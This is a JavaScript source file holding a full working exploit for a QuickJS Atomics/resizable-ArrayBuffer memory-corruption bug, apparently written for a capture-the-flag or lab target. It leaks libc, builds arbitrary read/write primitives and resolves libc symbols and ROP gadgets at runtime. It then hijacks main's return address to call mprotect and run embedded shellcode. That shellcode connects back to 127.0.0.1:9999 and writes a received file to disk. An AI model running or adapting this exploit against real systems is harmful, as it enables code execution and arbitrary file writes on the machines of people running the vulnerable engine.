'use strict';

// Offset-independent QuickJS Atomics RAB exploit -> connectback
// All runtime addresses (libc base, symbols, gadgets) are resolved dynamically.

const KEEP = [];

const U64_MASK = (1n << 64n) - 1n;
function u64(x) { return x & U64_MASK; }

function hexToBytes(hex) {
  const out = new Uint8Array(hex.length / 2);
  for (let i = 0; i < out.length; i++) {
    out[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
  }
  return out;
}

// -------------------- vulnerability-based primitives --------------------

function leak_libc_ptr() {
  // Ensure the shrunk chunk is not the top chunk (otherwise remainder merges into top).
  for (let attempt = 0; attempt < 16; attempt++) {
    const L1 = 0x3000;
    const L2 = 0x20;
    let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
    let ta = new BigInt64Array(rab);

    // Barriers after rab to avoid top consolidation.
    let barrier1 = new ArrayBuffer(0x1000);
    let barrier2 = new ArrayBuffer(0x1000);
    KEEP.push(rab, ta, barrier1, barrier2);

    let evil = { valueOf() { rab.resize(L2); return 0n; } };
    let leak = u64(Atomics.add(ta, 6, evil));
    if (leak > 0x10000000000n)
      return leak;
  }
  throw new Error('failed to leak libc pointer');
}

function make_arb_u64_view(base_addr, backing_bytes, test_addr /* BigInt or null */) {
  // Corrupt a BigUint64Array object's internal data pointer via stale ptr write.
  for (let attempt = 0; attempt < 80; attempt++) {
    let backing = new ArrayBuffer(backing_bytes);
    KEEP.push(backing);

    let victim = null;

    const L1 = 0x70;
    const L2 = 0x20;
    let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
    let ta = new BigInt64Array(rab);
    KEEP.push(rab, ta);

    // Heap grooming
    let spray = [];
    for (let i = 0; i < 250; i++) spray.push(new ArrayBuffer(0x40));
    KEEP.push(spray);

    let evil = {
      valueOf() {
        rab.resize(L2);
        victim = new BigUint64Array(backing);
        KEEP.push(victim);
        return base_addr;
      }
    };

    // index 13 -> byte offset 0x68
    Atomics.store(ta, 13, evil);

    if (victim !== null) {
      if (test_addr !== null) {
        const idx = Number((test_addr - base_addr) >> 3n);
        if (idx >= 0 && idx < victim.length && u64(victim[idx]) !== 0n)
          return { base: base_addr, size: BigInt(backing_bytes), victim };
      } else {
        return { base: base_addr, size: BigInt(backing_bytes), victim };
      }
    }
  }
  throw new Error('failed to build arbitrary u64 view');
}

// -------------------- memory access helpers on top of an arb view --------------------

function memIndex(mem, addr) {
  return Number((addr - mem.base) >> 3n);
}

function memRead64(mem, addr) {
  return u64(mem.victim[memIndex(mem, addr)]);
}

function memWrite64(mem, addr, val) {
  mem.victim[memIndex(mem, addr)] = u64(val);
}

function memReadU8(mem, addr) {
  const a = addr & ~7n;
  const w = memRead64(mem, a);
  const sh = (addr - a) * 8n;
  return Number((w >> sh) & 0xffn);
}

function memReadU16(mem, addr) {
  return memReadU8(mem, addr) | (memReadU8(mem, addr + 1n) << 8);
}

function memReadU32(mem, addr) {
  return (memReadU8(mem, addr) |
          (memReadU8(mem, addr + 1n) << 8) |
          (memReadU8(mem, addr + 2n) << 16) |
          (memReadU8(mem, addr + 3n) << 24)) >>> 0;
}

function memReadU64Bytes(mem, addr) {
  let v = 0n;
  for (let i = 0; i < 8; i++) {
    v |= BigInt(memReadU8(mem, addr + BigInt(i))) << (8n * BigInt(i));
  }
  return v;
}

function memReadCStringEq(mem, addr, s) {
  for (let i = 0; i < s.length; i++) {
    if (memReadU8(mem, addr + BigInt(i)) !== s.charCodeAt(i))
      return false;
  }
  return memReadU8(mem, addr + BigInt(s.length)) === 0;
}

function writeBytes64(mem, addr, bytes) {
  for (let i = 0; i < bytes.length; i += 8) {
    let v = 0n;
    for (let j = 0; j < 8 && (i + j) < bytes.length; j++) {
      v |= BigInt(bytes[i + j]) << (8n * BigInt(j));
    }
    memWrite64(mem, addr + BigInt(i), v);
  }
}

// -------------------- ELF parsing + symbol resolution (GNU hash) --------------------

const ELF_EHDR_E_PHOFF = 0x20n;
const ELF_EHDR_E_PHENTSIZE = 0x36n;
const ELF_EHDR_E_PHNUM = 0x38n;

const PT_LOAD = 1;
const PT_DYNAMIC = 2;

const PF_X = 1;

const DT_NULL = 0n;
const DT_STRTAB = 5n;
const DT_SYMTAB = 6n;
const DT_STRSZ = 10n;
const DT_SYMENT = 11n;
const DT_GNU_HASH = 0x6ffffef5n;

function parseProgramHeaders(libcMem, base) {
  const phoff = memReadU64Bytes(libcMem, base + ELF_EHDR_E_PHOFF);
  const phentsize = memReadU16(libcMem, base + ELF_EHDR_E_PHENTSIZE);
  const phnum = memReadU16(libcMem, base + ELF_EHDR_E_PHNUM);

  let phdrs = [];
  for (let i = 0; i < phnum; i++) {
    const ph = base + phoff + BigInt(i * phentsize);
    const p_type = memReadU32(libcMem, ph + 0n);
    const p_flags = memReadU32(libcMem, ph + 4n);
    const p_vaddr = memReadU64Bytes(libcMem, ph + 0x10n);
    const p_memsz = memReadU64Bytes(libcMem, ph + 0x28n);
    phdrs.push({ p_type, p_flags, p_vaddr, p_memsz });
  }
  return phdrs;
}

function gnuHash(str) {
  let h = 5381 >>> 0;
  for (let i = 0; i < str.length; i++) {
    h = (((h * 33) >>> 0) + str.charCodeAt(i)) >>> 0;
  }
  return h >>> 0;
}

function parseDynamic(libcMem, base, phdrs) {
  let dynAddr = 0n;
  let dynSize = 0n;
  for (const ph of phdrs) {
    if (ph.p_type === PT_DYNAMIC) {
      dynAddr = base + ph.p_vaddr;
      dynSize = ph.p_memsz;
      break;
    }
  }
  if (dynAddr === 0n) throw new Error('no PT_DYNAMIC');

  let out = { strtab: 0n, symtab: 0n, strsz: 0n, syment: 0n, gnu_hash: 0n };

  for (let off = 0n; off < dynSize; off += 16n) {
    const tag = memReadU64Bytes(libcMem, dynAddr + off);
    const val = memReadU64Bytes(libcMem, dynAddr + off + 8n);
    if (tag === DT_NULL) break;
    if (tag === DT_STRTAB) out.strtab = val;
    else if (tag === DT_SYMTAB) out.symtab = val;
    else if (tag === DT_STRSZ) out.strsz = val;
    else if (tag === DT_SYMENT) out.syment = val;
    else if (tag === DT_GNU_HASH) out.gnu_hash = val;
  }

  if (!out.strtab || !out.symtab || !out.syment || !out.gnu_hash)
    throw new Error('missing dynamic tables');
  return out;
}

function resolveDynSymGNU(libcMem, dyn, name) {
  const gh = dyn.gnu_hash;

  const nbuckets = memReadU32(libcMem, gh + 0n);
  const symoffset = memReadU32(libcMem, gh + 4n);
  const bloom_size = memReadU32(libcMem, gh + 8n);

  const bloom_off = gh + 16n;
  const buckets_off = bloom_off + BigInt(bloom_size) * 8n;
  const chain_off = buckets_off + BigInt(nbuckets) * 4n;

  const h = gnuHash(name);
  const bucket = memReadU32(libcMem, buckets_off + BigInt((h % nbuckets) * 4));
  if (bucket < symoffset) return 0n;

  let idx = bucket;
  let chain_idx = idx - symoffset;

  while (true) {
    const h2 = memReadU32(libcMem, chain_off + BigInt(chain_idx * 4));
    if ((((h2 ^ h) >>> 0) & ~1) === 0) {
      const sym = dyn.symtab + BigInt(idx) * dyn.syment;
      const st_name = memReadU32(libcMem, sym + 0n);
      const strAddr = dyn.strtab + BigInt(st_name);
      if (memReadCStringEq(libcMem, strAddr, name)) {
        const st_value = memReadU64Bytes(libcMem, sym + 8n);
        return st_value;
      }
    }
    if (h2 & 1) break;
    idx++;
    chain_idx++;
  }
  return 0n;
}

function resolveLibcSymbol(libcMem, dyn, base, name) {
  const val = resolveDynSymGNU(libcMem, dyn, name);
  return val ? (base + val) : 0n;
}

// -------------------- gadget search --------------------

function patternToBigInt(patternBytes) {
  let v = 0n;
  for (let i = 0; i < patternBytes.length; i++) {
    v |= BigInt(patternBytes[i] & 0xff) << (8n * BigInt(i));
  }
  return v;
}

function findPattern(mem, start, end, patternBytes) {
  // Safe scan: always keep reads within [start, end).
  const patLen = patternBytes.length;
  const patMask = (1n << (8n * BigInt(patLen))) - 1n;
  const patVal = patternToBigInt(patternBytes);

  const lastPos = end - BigInt(patLen);
  const stop = end - 16n; // read 16-byte windows (two qwords)
  for (let a = start & ~7n; a < stop; a += 8n) {
    const w1 = memRead64(mem, a);
    const w2 = memRead64(mem, a + 8n);
    const win = w1 | (w2 << 64n);
    for (let i = 0; i < 8; i++) {
      const pos = a + BigInt(i);
      if (pos > lastPos) break;
      const seq = (win >> (8n * BigInt(i))) & patMask;
      if (seq === patVal) return pos;
    }
  }
  return 0n;
}

function findGadgetInExecSegments(libcMem, phdrs, base, patternBytes) {
  for (const ph of phdrs) {
    if (ph.p_type !== PT_LOAD) continue;
    if ((ph.p_flags & PF_X) === 0) continue;
    const segStart = base + ph.p_vaddr;
    const segEnd = segStart + ph.p_memsz;
    const g = findPattern(libcMem, segStart, segEnd, patternBytes);
    if (g) return g;
  }
  return 0n;
}

// -------------------- compute main() return address value dynamically --------------------

function findMainReturnValue(libcMem, libc_start_main_addr) {
  // Signature near the hidden function that calls main():
  //   mov rax, [rsp+8] ; call rax ; mov edi, eax ; call exit
  const sig = [0x48, 0x8b, 0x44, 0x24, 0x08, 0xff, 0xd0, 0x89, 0xc7, 0xe8];
  const win = 0x6000n;
  const hit = findPattern(libcMem, libc_start_main_addr - win, libc_start_main_addr + win, sig);
  if (!hit) throw new Error('failed to locate main-call site');
  return (hit + 5n) + 2n;
}

// -------------------- find libc base from leak (bounded scan) --------------------

function findLibcBaseFromLeak(leak) {
  const scan = 0x400000; // 4MB window; main_arena is typically within this.
  const leakPage = leak & ~0xfffn;
  const start = leakPage - BigInt(scan);

  // Test at leakPage (mapped) instead of base (may not be mapped).
  const mem = make_arb_u64_view(start & ~7n, scan + 0x4000, leakPage & ~7n);

  for (let off = scan; off >= 0; off -= 0x1000) {
    const w = u64(mem.victim[off >> 3]);
    if ((w & 0xffffffffn) === 0x464c457fn)
      return (start + BigInt(off)) & ~0xfffn;
  }
  throw new Error('failed to find libc base');
}

// -------------------- exploit --------------------

// x86_64 Linux shellcode:
// - connect(127.0.0.1:9999)
// - recv: <u32 fn_len LE><filename><u32 content_len LE><content>
// - openat + write content
const SHELLCODE_HEX = (
  '4881ec00400000b829000000bf02000000be0100000031d20f054989c4' +
  '66c70424020066c7442402270fc74424047f00000131c04889442408b8' +
  '2a0000004c89e7488d3424ba100000000f05488d5c24204c89e74889de' +
  'ba0400000031c00f054885c00f8ef20000004801c629c275ec448b3b48' +
  '8d5c24284c89e74889de4489fa31c00f054885c00f8ecd0000004801c6' +
  '29c275ec42c6043b004c8d4424244c89e74c89c6ba0400000031c00f05' +
  '4885c00f8ea40000004801c629c275ec458b30b80101000048c7c79cff' +
  'ffff488d742428ba4102000041baa40100000f054989c54c8d8c240010' +
  '00004585f6744f4489f03d00100000760841bf00100000eb034189c74c' +
  '89e74c89ce4489fa31c00f054885c07e454801c629c275f04c89ef4c89' +
  'ce4489fab8010000000f054885c07e294801c629c275ed4529feebacb8' +
  '030000004489ef0f05b8030000004489e70f0531ffb83c0000000f0531' +
  'ffb83c0000000f05'
);

function pwn() {
  // 1) libc leak
  const leak = leak_libc_ptr();

  // 2) libc base
  const libcBase = findLibcBaseFromLeak(leak);

  // 3) libc memory view (base is mapped; test at base)
  const libcMem = make_arb_u64_view(libcBase & ~7n, 0x900000, libcBase & ~7n);
  if (memReadU32(libcMem, libcBase) !== 0x464c457f)
    throw new Error('libc base sanity failed');

  const phdrs = parseProgramHeaders(libcMem, libcBase);
  const dyn = parseDynamic(libcMem, libcBase, phdrs);

  // Symbols
  const mprotect = resolveLibcSymbol(libcMem, dyn, libcBase, 'mprotect');
  if (!mprotect) throw new Error('resolve mprotect failed');

  let environSym = resolveLibcSymbol(libcMem, dyn, libcBase, 'environ');
  if (!environSym)
    environSym = resolveLibcSymbol(libcMem, dyn, libcBase, '__environ');
  if (!environSym) throw new Error('resolve environ failed');

  const libc_start_main = resolveLibcSymbol(libcMem, dyn, libcBase, '__libc_start_main');
  if (!libc_start_main) throw new Error('resolve __libc_start_main failed');

  // 4) find saved RIP value after main() returns
  const mainRetVal = findMainReturnValue(libcMem, libc_start_main);

  // 5) stack top
  const envPtr = memRead64(libcMem, environSym);

  // 6) stack view
  const stackScan = 0x300000;
  const stackBase = (envPtr - BigInt(stackScan)) & ~7n;
  const stackMem = make_arb_u64_view(stackBase, stackScan, (envPtr & ~7n) - 0x10n);

  // locate saved RIP slot
  let ret_i = -1;
  const n = stackScan >> 3;
  for (let i = n - 1; i >= 0; i--) {
    if (u64(stackMem.victim[i]) === mainRetVal) { ret_i = i; break; }
  }
  if (ret_i < 0) throw new Error('main return address not found on stack');

  // 7) gadgets
  const ret_g = findGadgetInExecSegments(libcMem, phdrs, libcBase, [0xc3]);
  const pop_rdi = findGadgetInExecSegments(libcMem, phdrs, libcBase, [0x5f, 0xc3]);
  const pop_rsi = findGadgetInExecSegments(libcMem, phdrs, libcBase, [0x5e, 0xc3]);
  let pop_rdx = findGadgetInExecSegments(libcMem, phdrs, libcBase, [0x5a, 0xc3]);
  let pop_rdx_rbx = 0n;
  if (!pop_rdx) {
    pop_rdx_rbx = findGadgetInExecSegments(libcMem, phdrs, libcBase, [0x5a, 0x5b, 0xc3]);
    if (!pop_rdx_rbx) throw new Error('no pop rdx gadget');
  }
  if (!ret_g || !pop_rdi || !pop_rsi) throw new Error('missing gadgets');

  // 8) write shellcode on stack (ensure it stays within the mprotect range)
  const scBytes = hexToBytes(SHELLCODE_HEX);
  const scPage = (stackBase + 0x30000n) & ~0xfffn;
  const scAddr = scPage + 0x200n;

  writeBytes64(stackMem, scAddr, scBytes);

  // 9) ROP chain: mprotect(scPage, 0x2000, 7) ; jmp scAddr
  let chain = [
    ret_g,
    pop_rdi, scPage,
    pop_rsi, 0x2000n,
  ];
  if (pop_rdx) chain.push(pop_rdx, 7n);
  else chain.push(pop_rdx_rbx, 7n, 0n);
  chain.push(mprotect, scAddr);

  for (let j = 0; j < chain.length; j++)
    stackMem.victim[ret_i + j] = u64(chain[j]);
}

pwn();
